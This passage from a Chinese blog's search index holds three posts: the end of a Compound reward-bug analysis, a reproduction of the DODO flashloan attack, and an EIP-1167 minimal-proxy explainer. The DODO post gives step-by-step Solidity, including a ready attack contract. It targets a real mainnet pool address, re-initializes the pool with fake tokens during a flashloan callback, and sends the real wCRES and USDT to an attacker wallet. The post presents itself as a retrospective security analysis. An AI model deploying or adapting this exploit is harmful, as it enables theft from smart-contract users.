因此该漏洞并不是任何人都可以获利，需要在62次提案更新之前与某些特定代币进行存款或借款，并留有一定的余额，就可以获得大量的comp收益奖励。 通过更新提案可知，这些特定代币为cTUSD、cAAVE、cSAI、cSUSHI、cMKR、cYFI这6种代币，其池借贷指数和存款指数均被初始化为1e36！ 后续：​ Compound创始人表示拿出多出来收益的10%作为白帽奖励，希望获利的用户可以归还多出来的奖励，并通过提案63，64对问题进行修复。 *启示：* Compound虽然通过DAO的管理模式进行自治，但是在每次进行协议提案升级之前是否进行充分的安全性验证？当问题突发时，需要一定的提案过程与时间才可以对问题进行修复，充分暴露了对突发问题机动能力不足等问题！","categories":[],"tags":[{"name":"Compound、安全漏洞、治理提案","slug":"Compound、安全漏洞、治理提案","permalink":"http://example.com/tags/Compound%E3%80%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E3%80%81%E6%B2%BB%E7%90%86%E6%8F%90%E6%A1%88/"}]},{"title":"DODO_FlashLoan攻击复现--狸猫换太子","slug":"DODO-flashloan攻击分析与复现","date":"2021-09-27T02:42:40.000Z","updated":"2021-09-27T04:37:28.862Z","comments":true,"path":"2021/09/27/DODO-flashloan攻击分析与复现/","link":"","permalink":"http://example.com/2021/09/27/DODO-flashloan%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"通过事件最后的状态可知，攻击者地址减少的两种空气币数额与攻击合约增加的WrappedERC20、TetherToken数额一一对应，相当于将DVM合约中WrappedERC20、TetherToken的两种币”等价的“交换为两种空气币。 攻击简述 交易哈希： 10x395675b56370a9f5fe8b32badfa80043f5291443bd6c8273900476880fb5221e 攻击复现1.发两种空气币token1，token2.erc20代币合约 123456789101112131415161718192021222324252627282930313233343536373839404142434445/ SPDX-License-Identifier: MITpragma solidity &gt;=0.8.0 &lt;0.9.0;import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;contract _ERC20 is ERC20, Ownable &#123; uint8 private currentDecimals; enum TOKEN_TYPE &#123;CAPPED,UNCAPPED&#125; TOKEN_TYPE public tokenType; constructor( string memory _name, string memory _symbol, uint8 _decimals, uint256 _initialSupply, TOKEN_TYPE _tokenType ) ERC20(_name, _symbol) &#123; currentDecimals = _decimals; tokenType = _tokenType; / mint token to the address of the account that sent the transaction. transferOwnership(tx.origin); _mint(tx.origin, _initialSupply * (10**uint256(_decimals))); &#125; modifier unCapped &#123; require(tokenType == _ERC20.TOKEN_TYPE.UNCAPPED,&quot;support only uncapped token&quot;); _; &#125; function decimals() public view virtual override returns (uint8) &#123; return currentDecimals; &#125; function mint(address _address,uint256 _amount) public unCapped onlyOwner returns (bool) &#123; _mint(_address,_amount); return true; &#125; function burn(address _address,uint256 _amount) public unCapped onlyOwner returns (bool) &#123; _burn(_address,_amount); return true; &#125;&#125; token1： token2： 2.将空气币打入wCRES/USDT交易对wCRES/USDT 地址：0x051EBD717311350f1684f89335bed4ABd083a2b6 各打入足量的数量（10000000000000000000000000000）。 3.修改攻击合约参数123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109/** *Submitted for verification at Etherscan.io on 2021-01-22*//* Copyright 2020 DODO ZOO. SPDX-License-Identifier: Apache-2.0*/pragma solidity 0.6.9;pragma experimental ABIEncoderV2;interface DVM&#123; function flashLoan( uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data ) external; function init( address maintainer, address baseTokenAddress, address quoteTokenAddress, uint256 lpFeeRate, address mtFeeRateModel, uint256 i, uint256 k, bool isOpenTWAP ) external; &#125;interface Token &#123; function balanceOf(address account) external view returns (uint); function transfer(address recipient, uint amount) external returns (bool);&#125;interface USDT&#123; /USDT 并没有完全遵循 ERC20 标准 所以其接口需单独定义 function transfer(address to, uint value) external; function balanceOf(address account) external view returns (uint);&#125;contract poc&#123; uint256 wCRES_amount = 130000000000000000000000; uint256 usdt_amount = 1100000000000; address wCRES_token = 0xa0afAA285Ce85974c3C881256cB7F225e3A1178a; address usdt_token = 0xdAC17F958D2ee523a2206206994597C13D831ec7; address maintainer = 0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0; / 这里是刚生成的Token1地址 address token1 = 0x9431cc8868a6a9993E25C7abB93aD2aca5592c5C; / 这里是刚生成的Token2地址 address token2 = 0x445390C704Ed94F2F719d0eb7cda2633a72753A5; uint256 lpFeeRate = 3000000000000000; address mtFeeRateModel = 0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01; uint256 i = 1; uint256 k = 1000000000000000000; bool isOpenTWAP = false; / 这里填你的测试地址 address wallet = ; address dvm_wCRES_USDT = 0x051EBD717311350f1684f89335bed4ABd083a2b6; bytes data = abi.encodeWithSignature(&quot;init(address,address,address,uint256,address,uint256,uint256,bool)&quot;,maintainer,token1,token2,lpFeeRate,mtFeeRateModel,i,k,isOpenTWAP); function attack() public &#123; address me = address(this); DVM DVM_wCRES_USDT = DVM(dvm_wCRES_USDT); DVM_wCRES_USDT.flashLoan(wCRES_amount,usdt_amount,me,&quot; &quot;); &#125; function DVMFlashLoanCall(address a, uint256 b, uint256 c, bytes memory d) public&#123; DVM DVM_wCRES_USDT = DVM(dvm_wCRES_USDT); DVM_wCRES_USDT.init(maintainer,token1,token2,lpFeeRate,mtFeeRateModel,i,k,isOpenTWAP); Token(wCRES_token).transfer(wallet, Token(wCRES_token).balanceOf(address(this))); USDT(usdt_token).transfer(wallet, Token(usdt_token).balanceOf(address(this))); &#125;&#125; 该攻击合约主要完成以下工作： 1.调用DVM的闪电贷函数进行闪电贷，将传入的assetTo参数修改为攻击合约。 2.DVM执行闪电贷逻辑，乐观转账后，调用assetTo地址的DVMFlashLoanCall函数，由于攻击者传入的assetTo参数的值为攻击合约地址，因此会调用攻击合约中的DVMFlashLoanCall函数， 在该函数中，对wCRES/USDT 交易对合约（DVM合约）进行初始化函数（init）的调用。使得合约中 交易对地址信息baseTokenAddress,quoteTokenAddress,变为攻击者发行的两个空气币地址。 3.执行闪电贷的赎回操作 由于此时攻击者已将合约的交易对地址信息初始化为两种空气币的地址，并在实现给交易对地址打入了足量的两种空气币。使得DVM合约认为两种空气币就是原来的两种代币，并且是足量的，完成闪电贷最后的检查工作。 因此本次攻击是因为项目方并没有对初始化加以身份权限设定，使得任何人可以调用init函数。","categories":[],"tags":[{"name":"复盘分析、闪电贷","slug":"复盘分析、闪电贷","permalink":"http://example.com/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E9%97%AA%E7%94%B5%E8%B4%B7/"}]},{"title":"EIP1167-最小合约代理的理解","slug":"EIP1167-最小合约代理的理解","date":"2021-09-27T02:42:40.000Z","updated":"2021-09-27T03:27:18.030Z","comments":true,"path":"2021/09/27/EIP1167-最小合约代理的理解/","link":"","permalink":"http://example.com/2021/09/27/EIP1167-%E6%9C%80%E5%B0%8F%E5%90%88%E7%BA%A6%E4%BB%A3%E7%90%86%E7%9A%84%E7%90%86%E8%A7%A3/","excerpt":"","text":"避免“重复部署某一个合约导致过多的存储空间被用在重复的运行时字节码的存储”。 当需要某一份代码被大量部署时，这样就会使得大量的存储空间来存储相同的运行字节码，并消耗大量的Gas费用，引入EIP1167-最小合约代理来节省这部分存储与Gas消耗。 总体思路：设置一个母合约被用来委托调用，实现合约的逻辑部分；通过工厂合约创建多个子合约与用户直接交互。当用户向子合约发来请求时，子合约通过委托调用（delegatecall）的方式调用母合约的函数逻辑修改子合约的存储。因为子合约中并没有对应函数的处理逻辑，唯一实现的功能是委托调用母合约的函数，完成计算与状态更改，并将结果返回给用户。 通过EIP1167这种模式的设计可以很好的避免因代码复用导致资源浪费的问题。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131pragma solidity ^0.5.0;contract MetaCoinClonable &#123; mapping (address =&gt; uint) balances; function initialize(address metaCoinOwner, uint256 initialBalance) public &#123; balances[metaCoinOwner] = initialBalance; &#125; function sendCoin(address receiver, uint amount) public returns(bool sufficient) &#123; if (balances[msg.sender] &lt; amount) return false; balances[msg.sender] -= amount; balances[receiver] += amount; return true; &#125; function getBalance(address addr) view public returns(uint) &#123; return balances[addr]; &#125;&#125;contract Ownable &#123; /** * @dev Event to show ownership has been transferred * @param previousOwner representing the address of the previous owner * @param newOwner representing the address of the new owner */ event OwnershipTransferred(address previousOwner, address newOwner); // Owner of the contract address private _owner; /** * @dev Throws if called by any account other than the owner. */ modifier onlyOwner() &#123; require(msg.sender == owner()); _; &#125; /** * @dev The constructor sets the original owner of the contract to the sender account. */ constructor() public &#123; setOwner(msg.sender); &#125; /** * @dev Tells the address of the owner * @return the address of the owner */ function owner() public view returns (address) &#123; return _owner; &#125; /** * @dev Sets a new owner address */ function setOwner(address newOwner) internal &#123; _owner = newOwner; &#125; /** * @dev Allows the current owner to transfer control of the contract to a newOwner. * @param newOwner The address to transfer ownership to. */ function transferOwnership(address newOwner) public onlyOwner &#123; require(newOwner != address(0)); emit OwnershipTransferred(owner(), newOwner); setOwner(newOwner); &#125;&#125;// https://github.com/optionality/clone-factory/blob/master/contracts/CloneFactory.solcontract CloneFactory &#123; function createClone(address target) internal returns (address result) &#123; bytes20 targetBytes = bytes20(target); assembly &#123; let clone := mload(0x40) mstore(clone, 0x3d602d80600a3d3981f3363d3d373d3d3d363d73000000000000000000000000) mstore(add(clone, 0x14), targetBytes) mstore(add(clone, 0x28), 0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000) result := create(0, clone, 0x37) &#125; &#125; function isClone(address target, address query) internal view returns (bool result) &#123; bytes20 targetBytes = bytes20(target); assembly &#123; let clone := mload(0x40) mstore(clone, 0x363d3d373d3d3d363d7300000000000000000000000000000000000000000000) mstore(add(clone, 0xa), targetBytes) mstore(add(clone, 0x1e), 0x5af43d82803e903d91602b57fd5bf30000000000000000000000000000000000) let other := add(clone, 0x40) extcodecopy(query, other, 0, 0x2d) result := and( eq(mload(clone), mload(other)), eq(mload(add(clone, 0xd)), mload(add(other, 0xd))) ) &#125; &#125;&#125;contract MetaCoinCloneFactory is CloneFactory, Ownable &#123; MetaCoinClonable[] public metaCoinAddresses; event MetaCoinCreated(MetaCoinClonable metaCoin); address public libraryAddress; address public metaCoinOwner; function setLibraryAddress(address _libraryAddress) external onlyOwner &#123; libraryAddress = _libraryAddress; &#125; function createMetaCoin(address _metaCoinOwner, uint256 initialBalance) external &#123; MetaCoinClonable metaCoin = MetaCoinClonable( createClone(libraryAddress) ); metaCoin.initialize(_metaCoinOwner, initialBalance); metaCoinAddresses.push(metaCoin); emit MetaCoinCreated(metaCoin); &#125; function getMetaCoins() external view returns (MetaCoinClonable[] memory) &#123; return metaCoinAddresses; &#125;&#125; 第一步：部署母合约 母合约地址为：0x619B0084D96D51Ab63832d2e36d408f9d7d9a9f5 第二步：部署工厂合约 工厂合约地址为：0x15aB5Ad34da64381f0F0E72025de389653585Ef6 第三步：设置克隆合约（库合约）地址 将刚才获得的母合约地址0x619B0084D96D51Ab63832d2e36d408f9d7d9a9f5作为参数，调用setLibraryAddress函数，将母合约地址设置为克隆合约地址。 第四步：创建子合约（可设置多个） 将合约的owner地址和初始化余额作为参数，调用createMetaCoin，获得子合约。 可通过调用getMetaCoins来查询部署子合约的地址。0x8aeb371cd806c56426d5722d32f8a6e1ad4cc605 通过查看子合约的字节码文件可发现，子合约的处理逻辑是将接收到的请求通过委托调用的方式传发给母合约来进行处理，但是子合约的存储信息是存储在子合约中的。因此可以将子合约看作母合约的一个代理合约。 可以看到接受用户请求的子合约中并不包含合约中各种函数的处理逻辑，子合约以代理的形式进行委托调用，调用合约的函数逻辑进行处理，并将信息反馈给用户，可以很好的避免合约部署时内存滥用和大量Gas消耗。","categories":[],"tags":[{"name":"EIP协议","slug":"EIP协议","permalink":"http://example.com/tags/EIP%E5%8D%8F%E8%AE%AE/"}]}],"categories":[],"tags":[{"name":"复盘分析、闪电贷、价格预言机","slug":"复盘分析、闪电贷、价格预言机","permalink":"http://example.com/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E9%97%AA%E7%94%B5%E8%B4%B7%E3%80%81%E4%BB%B7%E6%A0%BC%E9%A2%84%E8%A8%80%E6%9C%BA/"},{"name":"复盘分析、套利","slug":"复盘分析、套利","permalink":"http://example.com/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E5%A5%97%E5%88%A9/"},{"name":"复盘分析、闪电贷、套利","slug":"复盘分析、闪电贷、套利","permalink":"http://example.com/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E9%97%AA%E7%94%B5%E8%B4%B7%E3%80%81%E5%A5%97%E5%88%A9/"},{"name":"复盘分析、闪电贷、重入、","slug":"复盘分析、闪电贷、重入、","permalink":"http://example.com/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E9%97%AA%E7%94%B5%E8%B4%B7%E3%80%81%E9%87%8D%E5%85%A5%E3%80%81/"},{"name":"Compound、安全漏洞、治理提案","slug":"Compound、安全漏洞、治理提案","permalink":"http://example.com/tags/Compound%E3%80%81%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E3%80%81%E6%B2%BB%E7%90%86%E6%8F%90%E6%A1%88/"},{"name":"复盘分析、闪电贷","slug":"复盘分析、闪电贷","permalink":"http://example.com/tags/%E5%A4%8D%E7%9B%98%E5%88%86%E6%9E%90%E3%80%81%E9%97%AA%E7%94%B5%E8%B4%B7/"},{"name":"EIP协议","slug":"EIP协议","permalink":"http://example.com/tags/EIP%E5%8D%8F%E8%AE%AE/"}]}